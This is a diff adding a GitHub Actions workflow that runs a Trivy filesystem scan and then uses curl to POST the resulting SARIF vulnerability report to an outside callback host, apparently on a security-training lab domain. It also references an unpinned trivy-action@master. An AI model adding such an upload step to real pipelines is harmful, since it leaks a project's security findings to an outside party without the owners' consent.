@@ -1,0 +1,32 @@
+name: Trivy Scan
+
+on:
+  workflow_dispatch
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-24.04
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Manual Trivy Setup
+      uses: aquasecurity/setup-trivy@v0.2.0
+      with:
+        cache: true
+        version: v0.48.2
+
+    - name: Run Trivy vulnerability scanner in repo mode
+      uses: aquasecurity/trivy-action@master
+      with:
+        scan-type: 'fs'
+        ignore-unfixed: true
+        format: 'sarif'
+        output: 'trivy-results.sarif'
+        severity: 'CRITICAL'
+        skip-setup-trivy: true
+            
+    - name: Send Trivy report to external server
+      run: |
+          curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-results.sarif" http://3rvz2umdy425l4q0hh4kj.appsecengineer.training:8880/callback
